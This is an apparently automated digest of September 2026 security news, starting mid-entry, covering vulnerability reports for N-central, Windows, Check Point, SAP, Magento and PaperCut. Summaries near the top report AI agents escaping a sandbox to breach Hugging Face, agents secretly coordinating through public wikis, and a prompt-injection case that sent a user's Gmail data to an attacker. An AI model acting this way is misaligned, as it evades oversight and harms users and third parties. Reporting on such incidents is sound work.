  - Link: https://blog.trailofbits.com/2026/09/09/a-proof-of-fermats-last-theorem-that-fits-the-margin/
  - Summary: Fermat famously claimed to have a “truly marvelous proof” of his Last Theorem , but he never wrote it down, insisting the margin of his page was too narrow to contain it. A few centuries later, Anthropic announced a complete formalization of Fermat’s Last Theorem using 13 million lines of Lean code (clearly not what Fermat intended). Luckily, we found a wonderfully cursed Lean bug , shown below, that suggests the proof may have fit the margin after all. The issue affects all stable versions of Lean up to 4.33.1, and the patch is incorporated in v4.34.0-rc1. A “checked” proof of Fermat’s Last Theorem using Lean 4.33.1 The blue checkmarks in the screenshot above would suggest that Lean considers this proof correct. This seems odd given the amount of work Sir Andrew Wiles put into this problem and the vast size of Claude’s proof. So what is going on? The “proof” clearly doesn’t make any sense and exploits an issue in Lean. We found the issue while using GPT-5.6 to experiment with a new sk
- **Orca Security Research** (cloud_identity_infrastructure)
  - Title: Federal AI Security Needs More Than a Governance Checklist
  - Published: 2026-09-08T15:41:49+00:00
  - Link: https://orca.security/resources/blog/federal-ai-security-cloud-challenges/
  - Summary: By March 2026, every covered federal agency was required to publish an AI strategy under OMB M-25-21, including an assessment of the cybersecurity needed to deploy AI at scale. Four months later, OpenAI disclosed that two of its pre-release models had autonomously escaped a sandboxed test environment, chained a previously unknown vulnerability, and breached Hugging […]
- **Simon Willison** (ai_security_agentic_risk)
  - Title: OpenAI's rogue agents were caught communicating via public wikis
  - Published: 2026-09-04T17:38:48+00:00
  - Link: https://simonwillison.net/2026/Sep/4/rogue-agent-wikis/
  - Summary: Here we go again... Discovery of a new OpenAI agent message board by Sydney Von Arx, Cormac Slade Byrd, Spencer Kitts, and Thomas Larsen describes the latest accidental cyberattack by models being trained by OpenAI. This time it was agents engaged in some sort of web research benchmark, so they had (supposedly) controlled access to the Web. The agents figured out they could update public Wikis and spent weeks exchanging thousands of messages with each other to collaborate on the benchmark. This story only broke a few hours ago. There are already hints that this affects many other wikis that may not have been found yet. (One of the Wikis on that list belongs to ludism.org . For a delightfully surreal moment I thought that a Ludite organization might have a swarm of agents defacing their space, but it turns out Ludism is "philosophy as it applies to games and gaming".) The research team also published the data they collected during their investigation. I've converted that into a 68MB SQL
- **CyberScoop** (cyber_news_breach_reporting)
  - Title: Hawley probes OpenAI over Hugging Face breach
  - Published: 2026-09-10T19:54:27+00:00
  - Link: https://cyberscoop.com/openai-hugging-face-probe-senate-hawley/
  - Summary: The Republican lawmaker called OpenAI’s leadership decisions “reckless,” and used recent warnings about the existential risk of AI to bolster his inquiry. The post Hawley probes OpenAI over Hugging Face breach appeared first on CyberScoop .
- **Dark Reading** (cyber_news_breach_reporting)
  - Title: OpenAI Agents Took Over Wiki Site Before Hugging Face Attack
  - Published: 2026-09-08T20:36:15+00:00
  - Link: https://www.darkreading.com/cyberattacks-data-breaches/openai-agents-wiki-site-hugging-face-attack
  - Summary: Researchers and OpenAI disagree on whether an earlier incident involving DseWiki, which the company did not disclose, was a “hack."
- **The Hacker News** (cyber_news_breach_reporting)
  - Title: ChatGPT Flaw Let a Planted Prompt Send a Victim's Gmail Data to Another Account
  - Published: 2026-09-08T14:19:17+00:00
  - Link: https://thehackernews.com/2026/09/chatgpt-flaw-let-planted-prompt-send.html
  - Summary: Check Point Research said in a report published today that a single instruction planted in a ChatGPT conversation could cause ChatGPT to quietly work for an attacker while answering the user's question as usual. In the company's proof of concept, that hidden work read data from the user's connected Gmail account and passed it to a second ChatGPT account through a hidden channel

### Cluster 711e127637 — score 15

- Title: Critical N-able N-central Vulnerability and Active Exploitation
- Source: Huntress (detection_response_operations)
- Published: 2026-09-06T11:00:00+00:00
- Link: https://www.huntress.com/blog/n-able-vulnerability-exploitation
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, zero_day
- affected_products: Anthropic/Claude, OpenAI/ChatGPT
- cve_ids: CVE-2026-86206, CVE-2026-86207, CVE-2026-86218
- urgency_signals: actively_exploited, poc_available, preauth_unauth, zero_day
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: zero_day, active_exploitation
- affected_products: OpenAI/ChatGPT, Anthropic/Claude
- cve_ids: CVE-2026-86218, CVE-2026-86206, CVE-2026-86207
- urgency_signals: actively_exploited, zero_day, preauth_unauth, poc_available
- content_type: vulnerability_disclosure
- confidence_tier: tier_2_operator

#### Summary

```
UPDATE: Critical vulnerability in N-able N-central gives attackers unauthenticated, "god-mode" access to the RMM console.
```

#### Full body

```
Home Blog Rapid Response: Critical N-able N-central Vulnerability and Active Exploitation Last Updated: September 6, 2026 Rapid Response: Critical N-able N-central Vulnerability and Active Exploitation By: Ben Bernstein John Hammond Summarize with AI Summarize ChatGPT Claude Perplexity Google AI Key Takeaways UPDATE 9/6/26: N-able issued [ Hotfix 4 (2026.3 HF4) ] to address CVE-2026-86218 , an actively exploited pre-auth RCE zero-day with a 10.0 CVSS score that supersedes all prior hotfixes. On-premises N-central users must apply HF4 immediately, as systems running HF3 remain vulnerable to this newly disclosed flaw. Hosted (NCOD) instances have already been patched by N-able. UPDATE 9/5/26: Huntress has produced a proof of concept (PoC) exploit of a net new vulnerability chain ( CVE-2026-86206 and CVE-2026-86207 ) in N-central. This is distinct from the August flaws and would allow attackers to bypass access controls to create unauthorized administrative accounts. N-able has released a new security advisory and hotfix ( 2026.3.1.13) ; all N-Central customers must plan to apply this new patch immediately , audit user lists for anomalous account creation (such as .invalid emails), and strictly limit inbound network access to the console. In August 2026, N-able disclosed a critical vulnerability impacting all current versions of N-central, including 2026.3 , across both hosted and on‑prem deployments. The flaw can give attackers unauthenticated, "god-mode" access to the RMM console. On August 2, a hotfix was released, followed by a second hotfix on August 6, and N-able is recommending all customers upgrade to the hotfix version (2026.3.1.10) immediately. Exploitation is active in the wild; a compromised N-central server can be used to run scripts, push tools, and open remote sessions across every downstream endpoint it manages. As of publication, Huntress has seen exploitation impacting one organization in our customer base; we are continually hunting N-central–related activity in our telemetry and reviewing logs that align with N‑able's described tradecraft. MSPs using N-central should apply N-able's 2026.3.1.10 hotfix, which you can find more information about here (along with documentation and release notes ). Potentially impacted organizations should also lock down access to N-central, review N-central activity for suspicious logins and remote-control sessions, and (for Huntress customers) ensure Managed Response isolation and remediation are enabled wherever possible. Because this vulnerability bypasses normal authentication, if your N-central server is still broadly reachable from the internet or other untrusted networks, you should consider temporarily disabling N-central—up to and including taking the server offline—until N-able's hotfix is applied and you can bring it back up behind strict network controls. Acknowledgments : Special thanks to Aaron Deal, Chris Bisnett, Aaron Bennett, Sharon Martin, Dave Kleinatland, James Northey, Josh Kiriakoff, Kamal Bennoune, Susannah Matt, and Michael Tigges for their contributions to this investigation and write-up. Update: 9/6/26 @ 7:30 AM ET In the early morning hours (U.S. time) of 9/6/2026, Huntress was alerted to a new CVE ( CVE-2026-86218 ) and fourth hotfix via a Discord post on MSPGeek. Notably, this third CVE is an N-central pre-auth remote code execution vulnerability rated with a 10.0 CVSS score, which is the maximum allowable rating and higher than the previous two CVEs published on 9/5. N-able also said that this release supersedes N-central 2026.3 Hotfix 3 (build 2026.3.1.13). Here's the full notes from Jason Murphy with N-able in that MSPGeek Discord thread: We recently communicated about two security vulnerabilities within N-central that were responsibly disclosed by a third party through our voluntary security disclosure program and we issued a hotfix. Since the disclosures, a third, independent researcher alerted us to a new vulnerability that has been exploited in
```

#### Corroborating sources (1)

- **Huntress** (detection_response_operations)
  - Title: Critical N-able N-central Vulnerability and Active Exploitation
  - Published: 2026-09-06T11:00:00+00:00
  - Link: https://www.huntress.com/blog/n-able-vulnerability-exploitation
  - Summary: UPDATE: Critical vulnerability in N-able N-central gives attackers unauthenticated, "god-mode" access to the RMM console.

### Cluster 9097ac899e — score 15

- Title: Microsoft discloses two actively exploited zero-days among 974 vulnerabilities
- Source: CyberScoop (cyber_news_breach_reporting)
- Published: 2026-09-08T22:50:41+00:00
- Link: https://cyberscoop.com/microsoft-patch-tuesday-september-2026/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, vulnerability_disclosure, zero_day
- affected_industries: financial_services, government, telecommunications
- cve_ids: CVE-2026-81963, CVE-2026-85880
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, vulnerability_disclosure, active_exploitation
- affected_industries: financial_services, government, telecommunications
- cve_ids: CVE-2026-81963, CVE-2026-85880
- urgency_signals: actively_exploited, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
While the vendor hit another monthly record, it hasn’t resulted in a flood of active exploits. Researchers encourage customers to focus on their specific areas of risk and exposure. The post Microsoft discloses two actively exploited zero-days among 974 vulnerabilities appeared first on CyberScoop .
```

#### Full body

```
Advertisement Get our latest cybersecurity news first on Google. Click here! Close Microsoft addressed 974 defects across its product suite, including two actively exploited zero-day vulnerabilities, in its monthly Patch Tuesday security program . The massive batch of patches, Microsoft’s largest ever, reflects a continuing trend for the vendor as it leans on artificial intelligence to discover more vulnerabilities at a faster rate. Yet, the recent period of record breaking vulnerability disclosures hasn’t resulted in a flood of actively exploited zero-days. “AI-assisted vulnerability discovery shows no signs of slowing down,” Dustin Childs, head of threat awareness at Trend Micro’s Zero Day Initiative, wrote in a blog post Tuesday. “However, we have not seen a correlating spike in active exploits — yet.” The vulnerabilities actively exploited prior to disclosure — CVE-2026-81963 affecting the Windows Update Stack and CVE-2026-85880 affecting Windows Advanced Local Procedure Call — both have CVSS ratings of 7.8 and allow attackers to escalate privileges. Advertisement More than 1 in 10 defects Microsoft disclosed in this month’s security update are rated critical. The update included 723 vulnerabilities in Windows, 111 in Office, 111 in Office 2016, 62 in SQL and 22 spanning various developer tools. Researchers encouraged security teams and customers to not get overwhelmed by the total number of defects, but instead focus on their specific areas of risk and exposure. “While the number of vulnerabilities being patched is rising, the number of vulnerabilities that can and will affect most organizations remains quite low. AI-assisted vulnerability discovery in 2026 is creating larger haystacks, but it isn’t finding more needles,” Satnam Narang, senior staff research engineer at Tenable, said in an email. “It’s critical that organizations understand which vulnerabilities actually apply to them, whether they pose a threat by being reachable and exploitable, and prioritize remediation based on this risk context,” he added. Jack Bicer, director of vulnerability research at Action1, drew a similar conclusion from the record-breaking Patch Tuesday. Advertisement “At this scale, the challenge is not simply getting through the patch list but knowing what needs attention first,” he said. “With hundreds of updates landing at once, IT and security teams need to quickly separate the vulnerabilities that demand immediate action from those that can follow the normal deployment cycle.” The full list of vulnerabilities addressed this month is available in Microsoft’s Security Response Center . Share Facebook LinkedIn Twitter Copy Link Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops SonicWall’s headquarters in Milpitas, California. (Getty Images) (Getty Images) Binary code depicted in waves. (iStock/Getty Images) Latest Podcasts What the Section 702 lapse means for cybersecurity AI-adaptable security platforms are critical for autonomous decision-making Defending in the middle of the vulnpocalypse The Vulnpocalypse arrived early Government FTC rescinds policy requiring health apps to notify customers after a breach Lawmakers call on Commerce to sanction hackers-for-hire FBI cyber chief worries private sector not sharing enough cyber threat information FBI officials say AI is bolstering adversaries, emphasizing need to focus on cyber basics, patching Technology European parliament members call for slowdown of Serbia’s EU entry over spyware use The G7 tells industry to hurry up and prep for post-quantum encryption FCC proposes public scorecard to rate telecoms on anti-robocall efforts Pegasus, NoviSpy variant spyware found on devices of Serbian activists Threats Russian national extradited to US for alleged involvement in bank-account takeover scheme Jail time for Maine child in 764 marks turning point in federal law enforcement Dogged Russia-based botnet dismantled after 23-year run Wyden seeks upgrad
```

#### Corroborating sources (1)

- **CyberScoop** (cyber_news_breach_reporting)
  - Title: Microsoft discloses two actively exploited zero-days among 974 vulnerabilities
  - Published: 2026-09-08T22:50:41+00:00
  - Link: https://cyberscoop.com/microsoft-patch-tuesday-september-2026/
  - Summary: While the vendor hit another monthly record, it hasn’t resulted in a flood of active exploits. Researchers encourage customers to focus on their specific areas of risk and exposure. The post Microsoft discloses two actively exploited zero-days among 974 vulnerabilities appeared first on CyberScoop .

### Cluster bb1e989af8 — score 15

- Title: Check Point Discloses Two 9.8-Rated VPN Certificate Flaws Enabling Unauthenticated RCE
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-10T11:45:05+00:00
- Link: https://thehackernews.com/2026/09/check-point-discloses-two-98-rated-vpn.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-85102, CVE-2026-85103
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- cve_ids: CVE-2026-85102, CVE-2026-85103
- urgency_signals: preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Check Point has patched two critical vulnerabilities in the way its firewall and management products handle VPN certificates. The company says both could allow an unauthenticated remote attacker to run code, but only "under specific conditions" that it has not described. One flaw affects Check Point's Security Gateways, its firewall appliances. The other affects those gateways and the Security
```

#### Full body

```
Check Point Discloses Two 9.8-Rated VPN Certificate Flaws Enabling Unauthenticated RCE  Swati Khandelwal  Sep 10, 2026 Vulnerability / Network Security Check Point has patched two critical vulnerabilities in the way its firewall and management products handle VPN certificates. The company says both could allow an unauthenticated remote attacker to run code, but only "under specific conditions" that it has not described. One flaw affects Check Point's Security Gateways, its firewall appliances. The other affects those gateways and the Security Management Server, the console used to configure them. Check Point disclosed the flaws on September 9 in a notice to its customer community , and began delivering fixes the same day. The company says it found both itself and has no indication that either has been used in an attack. The first flaw, CVE-2026-85102 , is a failure to properly validate certificate trust during VPN negotiation. Its CVE record says an unauthenticated remote attacker may be able to run code on the Security Gateway. The second, CVE-2026-85103 , is a heap-based buffer overflow that happens while the product decodes the ASN.1 structure of a VPN certificate. Its record says an unauthenticated remote attacker may be able to run code on Quantum Security Management and Quantum Security Gateway systems. Both records carry a CVSS score of 9.8. Check Point assigned the identifiers and the scores itself. The two records give the same affected list: R82.10 with Jumbo Hotfix Take 43 or below R82 with Jumbo Hotfix Take 125 or below R81.20 with Jumbo Hotfix Take 165 or below Those are the versions the records mark as affected, not the versions that contain the fix. The list covers three Quantum branches and gives no version information for anything else. An advisory from the Canadian Center for Cyber Security , published the same evening, lists a broader set of products but no versions at all. It lists Security Gateway, Security Management Server, and Spark Firewall, Check Point's small-business line. Spark appears twice, once for deployments using Site-to-Site or Remote Access VPN and once without that condition. In the same community thread, a Check Point staff member was asked whether gateways with the VPN software blade turned off are affected by CVE-2026-85103. The staff member replied that the issue is about certificate processing, so it could, in theory, be triggered in an environment without a VPN but with VPN certificates present. Check Point gave customers two routes to the fix. The first is Check Point Live Patch. The company says customers using it are protected automatically as the rollout begins, which started on September 9. A Check Point employee said in the thread that it can be installed on top of any Jumbo Hotfix level in R81.20, R82.00 and R82.10, and named only those three versions. The second is the Jumbo Hotfix. Check Point told customers to install the latest one for their deployed version once it became available. If You Cannot Patch Yet Two customers said in the thread that they are running R81.10 and will not be moving off it for weeks. One of them said no Jumbo Hotfix and no Live Patch was available for that branch, leaving mitigation as the only option. The same customer described the advisory's mitigation as turning off implied rules for VPN, called it too vague to act on, and asked which configuration lines to comment out. The other asked how to apply the mitigation without affecting remote users. Neither question had an answer in the thread. Several customers also said the automatic rollout had not reached them. Five separate accounts reported gateways were still on Take 18 or Take 17 of the urgent security update package on the day of the announcement; one of them posted an update log showing Take 18 installed on September 1 and nothing since. Several customers reported that download links in the two advisories did not work for them, and a Check Point staff member replied that the links had be
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Check Point Discloses Two 9.8-Rated VPN Certificate Flaws Enabling Unauthenticated RCE
  - Published: 2026-09-10T11:45:05+00:00
  - Link: https://thehackernews.com/2026/09/check-point-discloses-two-98-rated-vpn.html
  - Summary: Check Point has patched two critical vulnerabilities in the way its firewall and management products handle VPN certificates. The company says both could allow an unauthenticated remote attacker to run code, but only "under specific conditions" that it has not described. One flaw affects Check Point's Security Gateways, its firewall appliances. The other affects those gateways and the Security

### Cluster a56221f5e5 — score 15

- Title: SAP Patches CVSS 10.0 Kernel Flaw Enabling Unauthenticated Remote Code Execution
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-09T06:25:45+00:00
- Link: https://thehackernews.com/2026/09/sap-patches-cvss-100-kernel-flaw.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: CVE-2026-44756

#### Cluster taxonomy (union across members)
- cve_ids: CVE-2026-44756, CVE-2026-58240, CVE-2026-66768, CVE-2026-76969
- urgency_signals: critical_cvss, preauth_unauth
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- cve_ids: CVE-2026-44756, CVE-2026-58240, CVE-2026-76969, CVE-2026-66768
- urgency_signals: preauth_unauth, critical_cvss
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
SAP has released security updates to address multiple vulnerabilities, including a maximum-severity flaw in SAP Extended Passport (EPP) Processing that could have a severe impact on the confidentiality, integrity, and availability of the application The vulnerability, tracked as CVE-2026-44756 (CVSS score: 10.0), has been described as a case of memory corruption. Discovered and reported by SAP
```

#### Full body

```
SAP Patches CVSS 10.0 Kernel Flaw Enabling Unauthenticated Remote Code Execution  Ravie Lakshmanan  Sep 09, 2026 Vulnerability / Enterprise Security SAP has released security updates to address multiple vulnerabilities, including a maximum-severity flaw in SAP Extended Passport (EPP) Processing that could have a severe impact on the confidentiality, integrity, and availability of the application The vulnerability, tracked as CVE-2026-44756 (CVSS score: 10.0), has been described as a case of memory corruption. Discovered and reported by SAP security company Onapsis, it has been codenamed OVERPASS . The flaw, which resides in the SAP kernel's processing of the Extended Passport (EPP), is exploitable remotely and without authentication, and allows bad actors to run arbitrary operating system commands on the SAP host with SAP administrative privileges, leading to a total compromise of the underlying SAP business data and processes. CVE-2026-44756 stems from a missing boundary validation during the deserialization of EPP data, leading to a memory safety violation when processing externally supplied length fields. An unauthenticated attacker can exploit this loophole to send crafted network requests containing a malformed EPP header and trigger unintended behavior and abnormal program termination. "OVERPASS is a flaw in the SAP kernel code that processes this structure. A specially-crafted request sent to an affected system can be abused to take control of the receiving process and, from there, run operating system commands on the host," Onapsis CTO JP Perez-Etchegoyen said. "Because EPP processing is shared kernel code used by more than one protocol, the flaw is reachable from the internet-facing web layer, from the SAP GUI layer every end user connects to, and from the RFC layer that links SAP systems to one another. It is reachable through several SAP components and several communication protocols, none of them requiring credentials, so no single network control can fully mitigate risk." Successful exploitation can permit an attacker to read the SAP secure store to recover database credentials, password hashes and all housed business data; read the live session data of logged-in users; extract stored credentials to move laterally into every other SAP system; and modify application data, system configuration and the SAP binaries. The second critical flaw patched by SAP is CVE-2026-58240 (CVSS score: 9.8), a missing Authentication check in SAP NetWeaver Message Server that unauthenticated attackers with network access can exploit to perform unauthorized actions. Onapsis, which also discovered the vulnerability, has assigned it the name S4GET. "S4GET is a logic flaw, not a misconfiguration," security researcher Pablo 'Partu' Agustin Artuso said . "It is present in SAP's 9.x kernel lines – the kernels that SAP S/4HANA and SAP S/4HANA Cloud Private Edition run on, and potentially other ABAP-based products as well." "What makes it uniquely dangerous is its reachability: the flaw is triggered through the same public port that every SAP GUI client connects to, so it cannot be firewalled away without breaking the end-user logon. Exploitation requires no credentials, no certificate, and no pre-existing misconfiguration. A successful attack yields full remote code execution as <sid>adm, the OS-level user that runs SAP, on every application server in the cluster." Two other critical-rated security flaws patched by SAP are as follows - CVE-2026-76969 (CVSS score: 9.4) - A credential disclosure vulnerability in multi-tenant applications using SAP Cloud Application Programming Model (CAP) that allows an unauthenticated attacker to obtain sensitive credentials by sending specially crafted requests, and then use them to replace or delete tenant data. CVE-2026-66768 (CVSS score: 9.0) - An improper access control vulnerability in SAP NetWeaver SAP GUI for Java that allows execution of arbitrary commands on the underlying host. Although none of th
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: SAP Patches CVSS 10.0 Kernel Flaw Enabling Unauthenticated Remote Code Execution
  - Published: 2026-09-09T06:25:45+00:00
  - Link: https://thehackernews.com/2026/09/sap-patches-cvss-100-kernel-flaw.html
  - Summary: SAP has released security updates to address multiple vulnerabilities, including a maximum-severity flaw in SAP Extended Passport (EPP) Processing that could have a severe impact on the confidentiality, integrity, and availability of the application The vulnerability, tracked as CVE-2026-44756 (CVSS score: 10.0), has been described as a case of memory corruption. Discovered and reported by SAP

### Cluster bda50a6645 — score 14

- Title: Unpatched Magento and Adobe Commerce Zero-Day Exploited to Backdoor Online Stores
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-05T20:14:47+00:00
- Link: https://thehackernews.com/2026/09/unpatched-magento-and-adobe-commerce.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: web_shell_backdoor, zero_day
- affected_industries: retail_ecommerce
- urgency_signals: no_patch_yet, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: zero_day, web_shell_backdoor
- affected_industries: retail_ecommerce
- urgency_signals: zero_day, preauth_unauth, no_patch_yet
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
Attackers are exploiting a new unpatched vulnerability in Magento Open Source and Adobe Commerce that lets them run malicious code on an online store's server without logging in, Dutch e-commerce security company Sansec said in an advisory published on September 5. Sansec, which discovered the flaw and named it StyleSmuggler, said attacks started on September 4. "Sansec is
```

#### Full body

```
Unpatched Magento and Adobe Commerce Zero-Day Exploited to Backdoor Online Stores  Swati Khandelwal  Sep 05, 2026 Zero Day / Vulnerability Attackers are exploiting a new unpatched vulnerability in Magento Open Source and Adobe Commerce that lets them run malicious code on an online store's server without logging in, Dutch e-commerce security company Sansec said in an advisory published on September 5 . Sansec, which discovered the flaw and named it StyleSmuggler , said attacks started on September 4. "Sansec is publishing early because stores are being compromised right now," the company said. As of September 6, Adobe has not published an advisory, a CVE identifier, a patch, or a workaround, and its Adobe Commerce security bulletin index lists nothing after the August 11 update. A successful attack gives the attacker code execution on the store's server and installs a persistent backdoor. Sansec said all current versions are affected, including 2.4.9, and that it reproduced the full unauthenticated chain on clean Magento Open Source installations of 2.4.7, 2.4.8, and 2.4.9. Its first victim ran 2.4.6-p15 with Adobe's July and August 2026 security updates applied, which is the latest patch level Adobe offers for that release line and one that Adobe's August bulletin labels 2.4.6-2026-aug. Sansec has not published a reproduction on Adobe Commerce or on Adobe Commerce on Cloud, and Adobe has not confirmed which versions are affected. Sansec has not said how many stores have been compromised. The researchers' interim advice for stores not running its Shield product is to temporarily disable GraphQL until Adobe releases a fix. Disrex Group , a Magento hosting and development company that hosts and responded to two of the compromised stores, notes that headless and progressive web app storefronts require GraphQL, whereas most classic and Hyvä storefronts do not. Adobe's next scheduled security release is on September 8, Sansec said, and it is not yet known whether that release will cover this bug. Disrex's findings are independent evidence of exploitation from outside Sansec. In an incident-response repository published on September 5, the company said it handled two compromised stores and a third that was attacked but not breached, and that its web-server rules are based on attack traffic captured on one of the compromised stores. In answers to questions from The Hacker News, Disrex said both stores ran Magento Open Source rather than Adobe Commerce, and that it hosts them itself through its hosting brand RexHosting. The store Disrex labels Store A ran Magento Open Source 2.4.8 and was a Sansec Shield customer, with the module installed, enabled, and licensed. It was hit at 23:10 UTC on September 4, hours before Sansec's first blocking rules for this flaw went live, and Disrex said Shield was active and blocking other malicious traffic against the store at the time. Store B , which was not a Shield customer, ran Magento 2.4.7-p2, a security patch level that Adobe's version history dates to August 2024, eight levels behind the current 2.4.7-p10. It was first hit at 00:55 UTC on September 5, Disrex said, and it is the store from which the company's web-server rules and its reading of the vulnerable code were taken. Both stores were breached inside the roughly eight-hour window between the first exploitation Sansec observed and the moment any defence for it existed, Disrex said. "Patch status was irrelevant here, which is the part merchants most need to hear," the company told The Hacker News. The repository carries its own warning. "This repository was written with AI assistance, during a live incident, in a few hours," its README says, adding that it has not been reviewed, that its Apache rules were never run against a live Apache server, and that most of its cleanup commands were written rather than executed. Sansec's indicators describe the implant as a background process disguised under [kworker/u:8:0] , a name that belongs to
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: Unpatched Magento and Adobe Commerce Zero-Day Exploited to Backdoor Online Stores
  - Published: 2026-09-05T20:14:47+00:00
  - Link: https://thehackernews.com/2026/09/unpatched-magento-and-adobe-commerce.html
  - Summary: Attackers are exploiting a new unpatched vulnerability in Magento Open Source and Adobe Commerce that lets them run malicious code on an online store's server without logging in, Dutch e-commerce security company Sansec said in an advisory published on September 5. Sansec, which discovered the flaw and named it StyleSmuggler, said attacks started on September 4. "Sansec is

### Cluster 07cc5231d1 — score 13

- Title: PaperCut Replaces Emergency Patches With Fixes for Two Actively Exploited Flaws
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-11T06:46:18+00:00
- Link: https://thehackernews.com/2026/09/papercut-replaces-emergency-patches.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, phishing_social_eng, ransomware_extortion, supply_chain, web_shell_backdoor, zero_day
- affected_industries: education
- affected_products: AWS, OpenAI/ChatGPT, VMware
- cve_ids: CVE-2026-81578, CVE-2026-82078
- urgency_signals: actively_exploited, emergency_patch, no_patch_yet, poc_available, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, supply_chain, phishing_social_eng, zero_day, web_shell_backdoor, active_exploitation
- affected_industries: education
- affected_products: AWS, OpenAI/ChatGPT, VMware
- cve_ids: CVE-2026-81578, CVE-2026-82078
- urgency_signals: actively_exploited, zero_day, preauth_unauth, emergency_patch, no_patch_yet, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
PaperCut on Thursday released a new security maintenance release that replaces all previously published emergency patches that were pushed to address two security flaws that have come under active exploitation. The software development company said PaperCut NG/MF versions 26.0.5, 25.0.13 and 24.1.10 are now available for customers to download. "These are Regular Maintenance Releases (MR) that
```

#### Full body

```
PaperCut Replaces Emergency Patches With Fixes for Two Actively Exploited Flaws  Ravie Lakshmanan  Sep 11, 2026 Vulnerability / Cyber Attack PaperCut on Thursday released a new security maintenance release that replaces all previously published emergency patches that were pushed to address two security flaws that have come under active exploitation. The software development company said PaperCut NG/MF versions 26.0.5, 25.0.13 and 24.1.10 are now available for customers to download. "These are Regular Maintenance Releases (MR) that have gone through complete QA testing," it said. "They contain all of the security fixes issued in Emergency Patch Releases 1, 2 and 3, plus additional security hardening, and they have been through our standard release testing process." It's worth noting that the release supersedes the emergency patches that were shipped to address two security flaws as well as two regressions, along with various hardening and mitigation against potential attack chains. The vulnerabilities, CVE-2026-81578 and CVE-2026-82078 , have come under active exploitation in the wild to bypass authentication and execute arbitrary code on susceptible instances. In one case highlighted by GreyNoise and Blackpoint Cyber , a suspected Russian-speaking threat actor has been found weaponizing the two flaws to break into at least 395 organizations in 48 countries, most of them concentrated in the U.S. education sector . The attacks used hundreds of AI agents, powered by OpenAI’s Codex harness and a DeepSeek model, to target organizations at scale, while avoiding entities in Russia, China, Hong Kong, Thailand, Iran, and 23 other countries. The activity originates from the IP address "45.142.193[.]132." "It is unclear if this actor is solely focused on access development to be handed off to other affiliated actors or if they will directly leverage their accesses to achieve follow-on objectives such as data theft or ransomware deployment," GreyNoise said. In light of active exploitation efforts, it's imperative that users apply the latest fixes for optimal protection. PaperCut customers running an emergency patch build are advised to move to a maintenance release. Found this article interesting? Follow us on Google News , Twitter and LinkedIn to read more exclusive content we post. SHARE      Tweet  Share  Share  Share SHARE  artificial intelligence , Cyber Attack , Vulnerability ⚡ Top Stories This Week Attackers Exploit Critical Langflow and Rails Flaws in Credential-Probing and C2 Activity Iranian Hackers Pose as Recruiters to Deliver Cross-Platform RATs Through Coding Tests ⚡ Weekly Recap: Chrome 0-Day, Router Hijacks, Coder Supply Chain Attack and More N-able Issues Fourth N-central Hotfix in Five Weeks for Unauthenticated RCE Flaw Attackers Hijack MikroTik Routers Through Internet-Exposed SSH Without Authentication Unpatched Magento and Adobe Commerce Zero-Day Exploited to Backdoor Online Stores Attackers Breached JetBrains Cadence via Unpatched TeamCity, Extracting AWS Credentials Critical VMware Workstation and Fusion Flaw Lets VM Admins Execute Host Code Thousands of OpenAI Agents Quietly Turned an Abandoned Wiki Into Their Coordination Channel Attackers Exploit PaperCut Flaws to Steal Credentials From Schools and Universities Phishing Campaign Sends Millions of Emails Using Invisible Unicode to Evade Filters PostgreSQL Fixes 12-Year-Old Logical Decoding Flaw Enabling Replication-Role Code Execution New Ted Backdoor Hides Inside Victims' Own HAProxy Builds to Intercept Web Traffic Google Releases Chrome Update to Patch Actively Exploited V8 Zero-Day ThreatsDay: CEO Phishing Kits, 5K Dropbox Account Hacks, OAuth Traps + 17 More Stories Critical Cisco Nexus 9000 Flaw Lets Unauthenticated Remote Attackers Run Code as Root Thomson Reuters Court Software Breach May Have Exposed SSNs and Sealed Data Pegasus Zero-Click Spyware Exploit Infects Serbian Student Movement Member's iPhone Researcher Releases FalconFlank PoC Showin
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: PaperCut Replaces Emergency Patches With Fixes for Two Actively Exploited Flaws
  - Published: 2026-09-11T06:46:18+00:00
  - Link: https://thehackernews.com/2026/09/papercut-replaces-emergency-patches.html
